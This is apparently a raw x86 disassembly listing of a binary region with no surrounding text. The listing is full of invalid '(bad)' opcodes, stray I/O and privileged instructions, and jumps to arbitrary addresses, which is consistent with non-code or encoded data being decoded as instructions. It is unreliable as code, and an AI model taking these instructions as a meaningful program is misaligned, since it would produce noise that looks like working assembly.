  42e90f:	jmp    0xc1eab355
  42e914:	jb     0x42e8ee
  42e916:	imul   edx,DWORD PTR [edx+0x2c],0x18d81d67
  42e91d:	js     0x42e98b
  42e91f:	pop    es
  42e920:	(bad)  
  42e921:	mov    ch,0xee
  42e923:	mov    ebp,0x936a99b6
  42e928:	dec    ecx
  42e929:	add    ah,al
  42e92b:	(bad)  
  42e92c:	outs   dx,DWORD PTR ds:[esi]
  42e92d:	imul   ecx,DWORD PTR [ebx-0x3d],0x4d982786
  42e934:	mov    WORD PTR [ebx+edx*1-0x1a7a552],ds
  42e93b:	mov    ebx,0xb74334a5
  42e940:	jns    0x42e975
  42e942:	addr16 inc esp
  42e944:	mov    cl,0x93
  42e946:	ins    BYTE PTR es:[edi],dx
  42e947:	cdq    
  42e948:	xchg   edi,eax
  42e949:	retf   0x859b
  42e94c:	std    
  42e94d:	scas   eax,DWORD PTR es:[edi]
  42e94e:	adc    al,0x5f
  42e950:	dec    eax
  42e951:	jo     0x42e97b
  42e953:	push   0xe83d52fe
  42e958:	xchg   esp,eax
  42e959:	rcr    BYTE PTR [eax-0x7313ebe8],0x5f
  42e960:	retf   0xf8d2
  42e963:	mov    eax,ds:0x1e8a37cb
  42e968:	dec    ebx
  42e969:	shr    BYTE PTR [ebx+0x70],1
  42e96c:	mov    dx,0x4072
  42e970:	icebp  
  42e971:	adc    ch,bl
  42e973:	lahf   
  42e974:	sub    al,0x28
  42e976:	aaa    
  42e977:	lds    edx,FWORD PTR [edi+edi*8]
  42e97a:	ja     0x42e96d
  42e97c:	xchg   edx,eax
  42e97d:	into   
  42e97e:	mov    ds:0x5dd1390f,eax
  42e983:	pop    esp
  42e984:	dec    edi
  42e985:	stos   BYTE PTR es:[edi],al
  42e986:	mov    ah,BYTE PTR [esi-0x6526595d]
  42e98c:	xchg   edi,eax
  42e98d:	ret    
  42e98e:	xchg   esi,eax
  42e98f:	call   0xf153:0xe8bdc3c1
  42e996:	and    BYTE PTR [esi],dl
  42e998:	aaa    
  42e999:	fwait
  42e99a:	aas    
  42e99b:	xchg   DWORD PTR [edi+0x1ae0213f],eax
  42e9a1:	ret    0xf9e5
  42e9a4:	xor    eax,0x187240ca
  42e9a9:	or     ecx,DWORD PTR [edx-0x29]
  42e9ac:	sbb    al,0x21
  42e9ae:	aas    
  42e9af:	fidiv  DWORD PTR [ebp+0x78]
  42e9b2:	and    eax,DWORD PTR [eax+0x50e2812c]
  42e9b8:	adc    esi,DWORD PTR [esi+0x4e34bef4]
  42e9be:	jae    0x42e94b
  42e9c0:	push   edx
  42e9c1:	adc    DWORD PTR [ebx+0x6c],esp
  42e9c4:	sbb    al,0x3f
  42e9c6:	push   esi
  42e9c7:	pop    esi
  42e9c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e9c9:	clc    
  42e9ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e9cb:	call   0xf7d3:0x87c662ec
  42e9d2:	bnd jb 0x42e9e6
  42e9d5:	jb     0x42ea4b
  42e9d7:	pop    ss
  42e9d8:	push   0xa1c17e94
  42e9dd:	rol    al,cl
  42e9df:	fadd   st,st(4)
  42e9e1:	mov    eax,0xbb73e720
  42e9e6:	ins    BYTE PTR es:[edi],dx
  42e9e7:	and    eax,0x40840c3f
  42e9ec:	test   BYTE PTR [ebp+0x41dacb47],0xa
  42e9f3:	jge    0x42e9b2
  42e9f5:	and    eax,0xca879110
  42e9fa:	fcomp  DWORD PTR [eax]
  42e9fc:	mov    ds:0x891d5c66,al
  42ea01:	(bad)  
  42ea02:	sbb    eax,eax
  42ea04:	xor    ebp,0xffffffea
  42ea07:	fmul   st,st(2)
  42ea09:	mov    ecx,0x15f984a5
  42ea0e:	pushf  
  42ea0f:	popf   
  42ea10:	add    BYTE PTR ss:[eax],al
	...
  42ea73:	add    ch,ah
  42ea75:	mov    edx,0xebdfe392
  42ea7a:	cmc    
  42ea7b:	mov    esi,0x66dc160c
  42ea80:	cdq    
  42ea81:	mov    esp,0xf46daa11
  42ea86:	add    DWORD PTR [eax],eax
  42ea88:	add    eax,0xa9000001
  42ea8d:	pop    edi
  42ea8e:	int3   
  42ea8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ea90:	add    esi,0xa33bc538
  42ea96:	pop    esp
  42ea97:	out    dx,eax
  42ea98:	sbb    BYTE PTR [ebp-0x915d68a],al
  42ea9e:	dec    edi
  42ea9f:	cmp    BYTE PTR [edi-0x149975fb],ah
  42eaa5:	pop    ds
  42eaa6:	sub    eax,0x52454bf5
  42eaab:	retf   
  42eaac:	ins    DWORD PTR es:[edi],dx
  42eaad:	push   cs
  42eaae:	js     0x42ea5d
  42eab0:	arpl   WORD PTR [ecx],cx
  42eab2:	inc    ebp
  42eab3:	stos   BYTE PTR es:[edi],al
  42eab4:	jle    0x42eb14
  42eab6:	push   cs
  42eab7:	call   0xc508a488
  42eabc:	pusha  
  42eabd:	out    dx,eax
  42eabe:	mov    ds:0xff2198fa,al
  42eac3:	dec    ebp
  42eac4:	or     BYTE PTR [eax+0x3eb5e53e],dh
  42eaca:	adc    dh,bh
  42eacc:	enter  0xa295,0xe1
  42ead0:	fucomp st(4)
  42ead2:	mov    edi,0xf5d078ae
  42ead7:	daa    
  42ead8:	sbb    eax,0xd9ecdb8d
  42eadd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42eade:	xchg   edx,eax
  42eadf:	jl     0x42eab2
  42eae1:	and    al,0xe9
  42eae3:	push   edx
  42eae4:	jle    0x42eae3
  42eae6:	fidivr DWORD PTR [esi+0x14ba8115]
  42eaec:	sub    esi,DWORD PTR [eax+0x639ff22d]
  42eaf2:	out    0x9c,eax
  42eaf4:	mov    edx,es
  42eaf6:	cwde   
  42eaf7:	pop    edx
  42eaf8:	mov    DWORD PTR [eax],edi
  42eafa:	xchg   ebp,eax
  42eafb:	mov    eax,DWORD PTR [ebx+0x4a]
  42eafe:	add    eax,0xf3d04443
  42eb03:	jmp    0x42eacf
  42eb05:	out    dx,al
  42eb06:	sbb    ebx,0x96ebc99e
  42eb0c:	inc    esp
  42eb0d:	push   ecx
  42eb0e:	out    0x19,al
  42eb10:	test   DWORD PTR [eax+0x18cb28be],esi
  42eb16:	(bad)  
  42eb17:	popa   
  42eb18:	xor    esi,DWORD PTR [ebp-0x60]
  42eb1b:	clc    
  42eb1c:	scas   eax,DWORD PTR es:[edi]
  42eb1d:	pop    esp
  42eb1e:	dec    edi
  42eb1f:	mov    fs:0xb3bb3abf,al
  42eb25:	jle    0x42eb78
  42eb27:	and    bl,BYTE PTR [ebp+0x28a0cf0]
  42eb2d:	out    dx,al
  42eb2e:	xchg   ebx,eax
  42eb2f:	lods   eax,DWORD PTR ds:[esi]
  42eb30:	mov    ebx,0xd33f8f34
  42eb35:	push   es
  42eb36:	sti    
  42eb37:	xor    BYTE PTR [ebx-0x10bc366],dh
  42eb3d:	sub    BYTE PTR [edx+0x2111fee4],ah
  42eb43:	fld    QWORD PTR [ebp-0x745b5782]
  42eb49:	popf   
  42eb4a:	nop
  42eb4b:	scas   eax,DWORD PTR es:[edi]
  42eb4c:	in     eax,0xe8
  42eb4e:	ss cmc 
  42eb50:	fucomp st(0)
  42eb52:	ret    
  42eb53:	aas    
  42eb54:	jb     0x42eb10
  42eb56:	sub    ebp,DWORD PTR [edx]
  42eb58:	repnz retf 
  42eb5a:	mov    WORD PTR [ecx],ds
  42eb5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42eb5d:	out    dx,al
  42eb5e:	inc    esp
  42eb5f:	sub    esi,ebp
  42eb61:	mov    dl,0x27
  42eb63:	jb     0x42eb7c
  42eb65:	inc    esp
  42eb66:	and    al,0x1e
  42eb68:	sbb    DWORD PTR [ebp+0x38],edi
  42eb6b:	sbb    eax,0xcf0cc825
  42eb70:	ss xchg esp,eax
  42eb72:	xlat   BYTE PTR ds:[ebx]
  42eb73:	stos   DWORD PTR es:[edi],eax
  42eb74:	loopne 0x42ebc5
  42eb76:	mov    ebp,0x8304d8e3
  42eb7b:	in     eax,dx
  42eb7c:	fisub  DWORD PTR [ebx]
  42eb7e:	sbb    DWORD PTR [esi-0x357fe8bf],esp
  42eb84:	mov    DWORD PTR [ebx],eax
  42eb86:	mov    dl,0x73
  42eb88:	add    eax,0x1fcf09
  42eb8d:	cmc    
  42eb8e:	xchg   ebp,eax
  42eb8f:	sahf   
  42eb90:	xor    BYTE PTR [eax],al
	...
  42ebf2:	add    BYTE PTR [eax],al
  42ebf4:	jle    0x42ec37
  42ebf6:	jne    0xfc41bb3b
  42ebfc:	pusha  
  42ebfd:	popf   
  42ebfe:	pop    ecx
  42ebff:	and    DWORD PTR [eax],0x72df5455
  42ec05:	cmc    
  42ec06:	add    DWORD PTR [eax],eax
  42ec08:	add    eax,0x57000001
  42ec0d:	idiv   BYTE PTR [edx+edx*1-0x14ad6848]
  42ec14:	mov    ebx,0xf8facbd
  42ec19:	push   ecx
  42ec1a:	sahf   
  42ec1b:	hlt    
  42ec1c:	xchg   ecx,eax
  42ec1d:	mov    bh,0xa1
  42ec1f:	lods   al,BYTE PTR ds:[esi]
  42ec20:	mov    cl,0x1b
  42ec22:	in     eax,0xee
  42ec24:	(bad)  
  42ec25:	adc    DWORD PTR [ecx+0x9],esp
  42ec28:	div    DWORD PTR ds:0x37f035e6
  42ec2e:	push   ecx
  42ec2f:	jno    0x42ebf1
  42ec31:	jmp    0x2c92c5eb
  42ec36:	sbb    al,dl
  42ec38:	call   0x634f17ad
  42ec3d:	(bad)  
  42ec3e:	ds jecxz 0x42ebf5
  42ec41:	pop    ecx
  42ec42:	xchg   al,bh
  42ec44:	sbb    DWORD PTR [eax+0x4e],esp
  42ec47:	push   ebp
  42ec48:	bound  esp,QWORD PTR [edi+0x6e0cbc8]
  42ec4e:	sub    ah,BYTE PTR [eax+0x8a207a4]
  42ec54:	and    al,0x32
  42ec56:	mov    eax,0x1ee76638
  42ec5b:	jge    0x42ec19
  42ec5d:	rol    DWORD PTR [ebp-0x47],1
  42ec60:	(bad)  
  42ec61:	or     cl,cl
  42ec63:	dec    esi
  42ec64:	push   esi
  42ec65:	icebp  
  42ec66:	loopne 0x42ec16
  42ec68:	iret   
  42ec69:	shl    DWORD PTR ds:0x82b5d79e,0xd0
  42ec70:	dec    esi
  42ec71:	jno    0x42ec7c
  42ec73:	int3   
  42ec74:	mov    al,ds:0x82f67aea
  42ec79:	outs   dx,BYTE PTR ds:[esi]
  42ec7a:	adc    cl,BYTE PTR [esi+0xf]
  42ec7d:	add    ch,BYTE PTR [edi+0xe]
  42ec80:	rcr    BYTE PTR [edi+0x5],cl
  42ec83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ec84:	push   esp
  42ec85:	and    bh,bh
  42ec87:	jnp    0x42ed04
  42ec89:	in     eax,dx
  42ec8a:	mov    edi,DWORD PTR [ebp+0xe]
  42ec8d:	adc    DWORD PTR [ecx],edi
  42ec8f:	cld    
  42ec90:	popa   
  42ec91:	or     edi,DWORD PTR [esi+0x5b366e09]
  42ec97:	(bad)  
  42ec9a:	(bad)  
  42ec9b:	cmp    BYTE PTR [ebp-0x15],al
  42ec9e:	cld    
  42ec9f:	pop    ebx
  42eca0:	inc    edx
  42eca1:	mov    al,0xa
  42eca3:	dec    eax
  42eca4:	out    0x3c,al
  42eca6:	mov    al,0x56
  42eca8:	ins    BYTE PTR es:[edi],dx
  42eca9:	mov    edx,0x4e9dc46d
  42ecae:	ror    BYTE PTR [eax],cl
  42ecb0:	lds    ecx,FWORD PTR [esi+0x10c634ec]
  42ecb6:	jns    0x42ecd6
  42ecb8:	sbb    ah,al
  42ecba:	clc    
  42ecbb:	rol    BYTE PTR [eax-0x2e],1
  42ecbe:	sbb    eax,0x32ddaef8
  42ecc3:	leave  
  42ecc4:	jbe    0x42ecc7
  42ecc6:	xchg   eax,esp
  42ecc8:	fst    DWORD PTR [esi-0x54d63d99]
  42ecce:	cs int 0x3c
  42ecd1:	sbb    BYTE PTR [ecx+edi*8-0x4ce0ab78],cl
  42ecd8:	rcl    BYTE PTR [eax],0x7a
  42ecdb:	mov    eax,ds:0x7e61944e
  42ece0:	rcl    BYTE PTR [ebx-0x68],cl
  42ece3:	mov    eax,ds:0xd201576a
  42ece8:	xor    cl,al
  42ecea:	push   ebx
  42eceb:	jo     0x42ecdc
  42eced:	pop    ss
  42ecee:	pop    edx
  42ecef:	dec    ecx
  42ecf0:	aaa    
  42ecf1:	stos   BYTE PTR es:[edi],al
  42ecf2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ecf3:	add    BYTE PTR [edx-0x3bbdb4cd],cl
  42ecf9:	repz push esi
  42ecfb:	out    dx,al
  42ecfc:	sub    BYTE PTR [edi+0x1473f6f2],cl
  42ed02:	jge    0x42ed02
  42ed04:	xor    ebx,ebx
  42ed06:	inc    ecx
  42ed07:	mov    al,ds:0x8125dc11
  42ed0c:	ins    BYTE PTR es:[edi],dx
  42ed0d:	pop    DWORD PTR ds:0xe12
	...
  42ed73:	add    BYTE PTR [edx],ch
  42ed75:	imul   BYTE PTR [edi+0x7fd9ffd8]
  42ed7b:	mul    bl
  42ed7d:	xor    al,BYTE PTR [ebp-0x775a245e]
  42ed83:	and    dh,BYTE PTR [edi-0xa]
  42ed86:	add    DWORD PTR [eax],eax
  42ed88:	add    eax,0x7a000001
  42ed8d:	into   
  42ed8e:	nop
  42ed8f:	outs   dx,BYTE PTR ds:[esi]
  42ed90:	mov    cs,WORD PTR [ecx+ebp*4+0x36]
  42ed94:	xor    eax,0x1a861b4c
  42ed99:	mov    bl,0xe1
  42ed9b:	inc    edx
  42ed9c:	scas   al,BYTE PTR es:[edi]
  42ed9d:	and    al,0xdd
  42ed9f:	push   edi
  42eda0:	inc    esp
  42eda1:	push   edi
  42eda2:	or     dh,BYTE PTR [eax]
  42eda4:	clc    
  42eda5:	sbb    eax,0x80979143
  42edaa:	lock jmp 0xfbb085e1
  42edb0:	sbb    dl,bl
  42edb2:	add    BYTE PTR [ecx-0x5],dh
  42edb5:	mov    ebx,0x86ea723b
  42edba:	jecxz  0x42ed6c
  42edbc:	add    al,0x54
  42edbe:	pop    ecx
  42edbf:	push   ecx
  42edc0:	mov    al,ds:0x8397178f
  42edc5:	mov    ebp,0x5c22b428
  42edca:	adc    BYTE PTR [ebp+0x59],dh
  42edcd:	(bad)  
  42edce:	lods   al,BYTE PTR ds:[esi]
  42edcf:	inc    esi
  42edd0:	es lock adc al,0xe5
  42edd4:	iret   
  42edd5:	in     al,0x23
  42edd7:	pushf  
  42edd8:	scas   eax,DWORD PTR es:[edi]
  42edd9:	scas   eax,DWORD PTR es:[edi]
  42edda:	stos   DWORD PTR es:[edi],eax
  42eddb:	jns    0x42ed92
  42eddd:	mov    WORD PTR [ecx-0x47],es
  42ede0:	pop    ds
  42ede1:	mov    ds:0xd2a19338,al
  42ede6:	sbb    bl,0x8c
  42ede9:	add    al,0xec
  42edeb:	jle    0x42edec
  42eded:	cmp    eax,0x9ff5a2a6
  42edf2:	mov    dl,0xa1
  42edf4:	dec    ecx
  42edf5:	add    cl,dl
  42edf7:	(bad)  
  42edf8:	push   cs
  42edf9:	mov    esp,0xa19babcd
  42edfe:	fsub   DWORD PTR [eax+ebx*4-0x6e]
  42ee02:	lds    esp,FWORD PTR [ecx]
  42ee04:	iret   
  42ee05:	(bad)  
  42ee06:	adc    esi,DWORD PTR [eax-0x526d50c7]
  42ee0c:	retf   0x686b
  42ee0f:	scas   eax,DWORD PTR es:[edi]
  42ee10:	adc    eax,0x367307b2
  42ee15:	add    edi,esp
  42ee17:	js     0x42ee77
  42ee19:	or     al,0x80
  42ee1b:	gs (bad) 
  42ee1e:	les    edx,FWORD PTR [esi+0xe]
  42ee21:	sbb    BYTE PTR [ebp+eiz*1-0x18],ch
  42ee25:	retf   
  42ee26:	ins    BYTE PTR es:[edi],dx
  42ee27:	mov    esp,0x27c91811
  42ee2c:	mov    eax,0x15fa24dc
  42ee31:	ins    BYTE PTR es:[edi],dx
  42ee32:	or     eax,0x5239cf9c
  42ee37:	xlat   BYTE PTR ds:[ebx]
  42ee38:	daa    
  42ee39:	sub    esi,edi
  42ee3b:	adc    ebp,DWORD PTR [edi-0x6db2e56c]
  42ee41:	fs push cs
  42ee43:	pmaxub mm3,QWORD PTR [esi-0x77]
  42ee47:	dec    eax
  42ee48:	ret    0xde28
  42ee4b:	scas   al,BYTE PTR es:[edi]
  42ee4c:	fcom   QWORD PTR [ebp-0x2bb1270a]
  42ee52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ee53:	inc    edi
  42ee54:	cli    
  42ee55:	repnz daa 
  42ee57:	imul   ebp,DWORD PTR [edi],0x89c9ca8f
  42ee5d:	push   edi
  42ee5e:	test   eax,0xad1ec008
  42ee63:	fidivr DWORD PTR [edx]
  42ee65:	imul   esp,DWORD PTR [ebx+0x4fd6325e],0x7
  42ee6c:	xchg   edx,eax
  42ee6d:	sub    BYTE PTR [eax+ebp*8-0x4cbb7b40],dl
  42ee74:	out    dx,eax
  42ee75:	and    al,al
  42ee77:	cdq    
  42ee78:	sub    DWORD PTR fs:[ebx],esp
  42ee7b:	dec    edx
  42ee7c:	cmp    DWORD PTR [edi+0x32],eax
  42ee7f:	jns    0x42eea4
  42ee81:	data16 jns 0x42ee21
  42ee84:	in     eax,0x70
  42ee86:	mov    ah,0x76
  42ee88:	inc    edi
  42ee89:	and    ecx,DWORD PTR [edi]
  42ee8b:	xchg   ebx,eax
  42ee8c:	push   es
  42ee8d:	jno    0x42ee95
  42ee8f:	(bad)  
	...
  42eef1:	add    BYTE PTR [eax],al
  42eef3:	add    bl,al
  42eef5:	add    cl,BYTE PTR [eax]
  42eef7:	xor    eax,0xf6ff3fc9
  42eefc:	jb     0x42ef3a
  42eefe:	jae    0x42ef25
  42ef00:	std    
  42ef01:	lea    eax,[ecx-0x12]
  42ef04:	jl     0x42eefd
  42ef06:	add    DWORD PTR [eax],eax
  42ef08:	add    eax,0x33000001
  42ef0d:	xor    al,0x5e
  42ef0f:	imul   ecx,esi,0xffffffe3
  42ef12:	stos   BYTE PTR es:[edi],al
  42ef13:	cmp    eax,0x2811c891
  42ef18:	fiadd  WORD PTR [edi]
  42ef1a:	aad    0xed
  42ef1c:	loopne 0x42ef53
  42ef1e:	outs   dx,BYTE PTR ds:[esi]
  42ef1f:	pop    ds
  42ef20:	mov    eax,ds:0x71ed9c10
  42ef25:	loope  0x42ef89
  42ef27:	lods   eax,DWORD PTR es:[esi]
  42ef29:	icebp  
  42ef2a:	fs out 0x90,al
  42ef2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ef2e:	jge    0x42eeb6
  42ef30:	cmp    DWORD PTR [ebp+0x11366857],ebx
  42ef36:	jmp    0x42ef3a
  42ef38:	jnp    0x42ef83
  42ef3a:	lea    ebx,[esi-0x41]
  42ef3d:	std    
  42ef3e:	cdq    
  42ef3f:	call   FWORD PTR [ebx]
  42ef41:	cmp    eax,0x66064236
  42ef46:	inc    ebx
  42ef47:	mov    ebx,0x8b9e4990
  42ef4c:	les    ecx,FWORD PTR [edi]
  42ef4e:	clc    
  42ef4f:	mov    ah,0xbf
  42ef51:	mov    al,ds:0x7460579a
  42ef56:	sbb    DWORD PTR [ebx+0x6f25e8a6],0xfd5745a2
  42ef60:	sub    dl,BYTE PTR [edi]
  42ef62:	idiv   ebp
  42ef64:	div    DWORD PTR [edi+0x411587c1]
  42ef6a:	daa    
  42ef6b:	mov    ecx,DWORD PTR [eax-0x25]
  42ef6e:	leave  
  42ef6f:	cmp    BYTE PTR [ecx-0x70d5b39d],bh
  42ef75:	dec    edx
  42ef76:	bts    DWORD PTR [eax],ecx
  42ef79:	push   ebx
  42ef7a:	or     bh,BYTE PTR [edx-0x53]
  42ef7d:	sub    dh,BYTE PTR [eax]
  42ef7f:	mov    DWORD PTR [ecx+edi*1+0x78b4c09],ecx
  42ef86:	sbb    eax,0x32a64f7a
  42ef8b:	in     al,0x17
  42ef8d:	sub    ch,ah
  42ef8f:	sbb    esp,DWORD PTR [ebx]
  42ef91:	pop    esi
  42ef92:	(bad)  
  42ef94:	out    0x81,eax
  42ef96:	pop    edi
  42ef97:	daa    
  42ef98:	or     DWORD PTR [esi+ebp*2],eax
  42ef9b:	not    BYTE PTR [edi-0x1b]
  42ef9e:	(bad)  
  42ef9f:	sbb    eax,0x26a789f2
  42efa4:	imul   DWORD PTR [esp+edx*2+0x366620ef]
  42efab:	or     eax,0x8e05266f
  42efb0:	lods   al,BYTE PTR ds:[esi]
  42efb1:	jg     0x42f00a
  42efb3:	inc    esi
  42efb4:	mov    cl,0x71
  42efb6:	dec    esi
  42efb7:	xchg   esi,eax
  42efb8:	mov    ebx,0xc841ff50
  42efbd:	mov    BYTE PTR [edx-0x67],dl
  42efc0:	or     BYTE PTR [edi],0xbd
  42efc3:	iret   
  42efc4:	pop    esi
  42efc5:	jo     0x42ef7d
  42efc7:	sahf   
  42efc8:	cmp    DWORD PTR [esi-0x26],edx
  42efcb:	push   ds
  42efcc:	aad    0x2e
  42efce:	mov    edi,0x9cab6d28
  42efd3:	and    DWORD PTR [ebp+0x1341531b],eax
  42efd9:	pop    ebx
  42efda:	js     0x42ef74
  42efdc:	sbb    BYTE PTR [ebp+0x3c],0xab
  42efe0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42efe1:	cmp    al,0x9e
  42efe3:	leave  
  42efe4:	hlt    
  42efe5:	call   0x693b4fb9
  42efea:	mov    esp,0x3d6904d0
  42efef:	rcl    BYTE PTR [ecx-0x2df199b1],0x0
  42eff6:	jb     0x42ef8a
  42eff8:	test   BYTE PTR [edx],0x18
  42effb:	inc    esi
  42effc:	xor    eax,0x42400f8d
  42f001:	sub    DWORD PTR [eax-0x131925a5],esp
  42f007:	adc    DWORD PTR [ecx],edi
  42f009:	aas    
  42f00a:	imul   BYTE PTR [edx+0x3a]
  42f00d:	ds js  0x42f06c
  42f010:	jle    0x42f012
	...
  42f072:	add    BYTE PTR [eax],al
  42f074:	adc    bh,BYTE PTR [esi]
  42f076:	int    0xe5
  42f078:	in     eax,dx
  42f079:	idiv   DWORD PTR [edx]
  42f07b:	(bad)  
  42f07c:	js     0x42f081
  42f07e:	mov    DWORD PTR [ecx],ecx
  42f080:	std    
  42f081:	xor    eax,0xf881eae2
  42f086:	add    DWORD PTR [eax],eax
  42f088:	add    eax,0xf8000001
  42f08d:	call   0x2d67:0x3ac50e93
  42f094:	inc    ecx
  42f095:	adc    DWORD PTR [edx+0x7ae67833],edx
  42f09b:	(bad)  
  42f09c:	loopne 0x42f116
  42f09e:	sbb    al,0xdb
  42f0a0:	sar    BYTE PTR [edi],1
  42f0a2:	stos   DWORD PTR es:[edi],eax
  42f0a3:	test   BYTE PTR ds:0xd71f3477,dl
  42f0a9:	xor    DWORD PTR [ecx+esi*1+0xce318a9],edx
  42f0b0:	or     eax,0xfb2b2510
  42f0b5:	js     0x42f058
  42f0b7:	loope  0x42f08d
  42f0b9:	aad    0xb4
  42f0bb:	pop    ss
  42f0bc:	xchg   BYTE PTR [eax+0x29],ah
  42f0bf:	(bad)  
  42f0c0:	push   ebp
  42f0c1:	mov    ds:0x2cbf3c9,al
  42f0c6:	mov    al,ds:0x8ebfa567
  42f0cb:	add    BYTE PTR [edx+0x599df885],bh
  42f0d1:	sar    BYTE PTR [eax],cl
  42f0d3:	cdq    
  42f0d4:	rol    DWORD PTR [ebx],0x33
  42f0d7:	xchg   ebx,eax
  42f0d8:	push   cs
  42f0d9:	ret    0x5d44
  42f0dc:	into   
  42f0dd:	xlat   BYTE PTR ds:[ebx]
  42f0de:	mov    ch,0xf0
  42f0e0:	fild   QWORD PTR [ebp-0x7f7c1c6b]
  42f0e6:	call   0x74796fbd
  42f0eb:	sub    DWORD PTR [ebx],eax
  42f0ed:	lods   al,BYTE PTR es:[esi]
  42f0ef:	jae    0x42f149
  42f0f1:	push   0x46f859bc
  42f0f6:	sub    eax,0xf1b49ee5
  42f0fb:	cmp    ah,al
  42f0fd:	ins    BYTE PTR es:[edi],dx
  42f0fe:	or     ebp,DWORD PTR [ecx+0x78]
  42f101:	push   edx
  42f102:	sti    
  42f103:	mov    DWORD PTR [eax],edx
  42f105:	inc    edx
  42f106:	aam    0x10
  42f108:	not    ch
  42f10a:	inc    BYTE PTR [esi]
  42f10c:	ins    DWORD PTR es:[edi],dx
  42f10d:	mov    ebx,0xf498a136
  42f112:	pop    ecx
  42f113:	pop    esp
  42f114:	cmc    
  42f115:	push   ds
  42f116:	sbb    al,0x11
  42f118:	test   eax,0x6e9e5cde
  42f11d:	mov    eax,0x2243683
  42f122:	mov    bh,0xa1
  42f124:	dec    eax
  42f125:	dec    ecx
  42f126:	jecxz  0x42f0b9
  42f128:	mov    ds:0x41d9d5c0,al
  42f12d:	stc    
  42f12e:	pop    edx
  42f12f:	add    dh,BYTE PTR [ebx]
  42f131:	mov    al,ds:0x1ff14c00
  42f136:	push   edx
  42f137:	das    
  42f138:	push   edx
  42f139:	add    eax,DWORD PTR ds:[edx+edx*4-0x53]
  42f13e:	or     edi,esi
  42f140:	daa    
  42f141:	fcomp  QWORD PTR [ebx-0x31]
  42f144:	retf   0xeb57
  42f147:	es ds lahf 
  42f14a:	cli    
  42f14b:	(bad)  
  42f14c:	push   edi
  42f14d:	inc    edi
  42f14e:	or     al,0x13
  42f150:	std    
  42f151:	push   ss
  42f152:	or     edi,ebx
  42f154:	(bad)  
  42f155:	in     al,0xe7
  42f157:	stc    
  42f158:	into   
  42f159:	jns    0x42f140
  42f15b:	pop    esi
  42f15c:	addr16 fs into 
  42f15f:	xor    DWORD PTR [edi+0x5d6841e1],0xffffffa7
  42f166:	dec    edx
  42f167:	out    0x51,eax
  42f169:	sbb    bh,BYTE PTR [ecx+0x4e]
  42f16c:	jle    0x42f18f
  42f16e:	sahf   
  42f16f:	xor    ecx,0x24
  42f172:	push   0xffffff99
  42f174:	jle    0x42f127
  42f176:	loop   0x42f11d
  42f178:	fs ret 
  42f17a:	(bad)  
  42f17b:	(bad)  
  42f17c:	leave  
  42f17d:	cmc    
  42f17e:	dec    ebp
  42f17f:	into   
  42f180:	inc    esi
  42f181:	add    bh,0xc3
  42f184:	les    esp,FWORD PTR [edx-0x491cee98]
  42f18a:	inc    edx
  42f18b:	cmp    ebp,edi
  42f18d:	scas   al,BYTE PTR es:[edi]
  42f18e:	push   ebp
  42f18f:	push   ebp
  42f190:	clc    
	...
  42f1f1:	add    BYTE PTR [eax],al
  42f1f3:	add    BYTE PTR [edx+0x26],bl
  42f1f6:	jecxz  0x42f23b
  42f1f8:	inc    edi
  42f1fa:	cli    
  42f1fb:	aas    
  42f1fc:	into   
  42f1fd:	retf   0x3f8e
  42f200:	mov    eax,es
  42f202:	out    0x77,al
  42f204:	xchg   cl,bh
  42f206:	add    DWORD PTR [eax],eax
  42f208:	add    eax,0x67000001
  42f20d:	push   es
  42f20e:	mov    dh,0xe3
  42f210:	lea    esp,[esi+0x74dc932f]
  42f216:	jecxz  0x42f24b
  42f218:	imul   BYTE PTR [ecx+0x355483e0]
  42f21e:	idiv   DWORD PTR [ebp+0x101793e2]
  42f224:	rol    dh,cl
  42f226:	repnz add eax,0xafddee7b
  42f22c:	dec    eax
  42f22d:	push   es
  42f22e:	pusha  
  42f22f:	mov    ah,0xac
  42f231:	jp     0x42f280
  42f233:	or     eax,0x47724cc6
  42f238:	xor    ah,BYTE PTR [esi]
  42f23a:	and    ah,BYTE PTR [edi+0x5e]
  42f23d:	cmp    BYTE PTR [esi],cl
  42f23f:	jne    0x42f233
  42f241:	and    ebp,DWORD PTR [edx-0x2dcf5833]
  42f247:	clc    
  42f248:	test   eax,0x89554fc5
  42f24d:	shl    BYTE PTR [edi+0x73],cl
  42f250:	shl    BYTE PTR [edx+0x3f],cl
  42f253:	cmp    eax,0xc9e0d31d
  42f258:	je     0x42f24a
  42f25a:	sub    dh,cl
  42f25c:	mov    ah,0x8e
  42f25e:	repz idiv BYTE PTR [ecx+0x3]
  42f262:	sti    
  42f263:	fcom   QWORD PTR [esi]
  42f265:	hlt    
  42f266:	rol    BYTE PTR [edi-0xd],cl
  42f269:	stc    
  42f26a:	ins    DWORD PTR es:[edi],dx
  42f26b:	pop    ebx
  42f26c:	mov    dh,0x15
  42f26e:	dec    esi
  42f26f:	xacquire xchg BYTE PTR [ebx+0x7a],al
  42f273:	pop    edx
  42f274:	add    DWORD PTR [edx+0x6d2ca032],ebp
  42f27a:	push   esi
  42f27b:	xchg   esi,eax
  42f27c:	out    dx,eax
  42f27d:	enter  0x48c0,0x68
  42f281:	sahf   
  42f282:	aaa    
  42f283:	fst    st(7)
  42f285:	xchg   ecx,eax
  42f286:	test   edx,ebx
  42f288:	sbb    DWORD PTR [esi+0xa],eax
  42f28b:	int    0xb3
  42f28d:	mov    ch,0xd1
  42f28f:	les    ebp,FWORD PTR [esi]
  42f291:	xchg   ebp,eax
  42f292:	int3   
  42f293:	sbb    al,0x10
  42f295:	add    edx,DWORD PTR [edx-0x18]
  42f298:	xchg   edi,eax
  42f299:	sub    dl,BYTE PTR [edx+esi*8+0x79c25195]
  42f2a0:	mov    ebx,0x492e37bc
  42f2a5:	xor    BYTE PTR [ecx-0x6185b60c],bh
  42f2ab:	sbb    BYTE PTR [edi+0x7d],bh
  42f2ae:	sub    eax,0xad1c08c7
  42f2b3:	js     0x42f2ef
  42f2b5:	outs   dx,DWORD PTR ds:[esi]
  42f2b6:	fs add al,0xa5
  42f2b9:	(bad)  
  42f2ba:	push   ss
  42f2bb:	js     0x42f28a
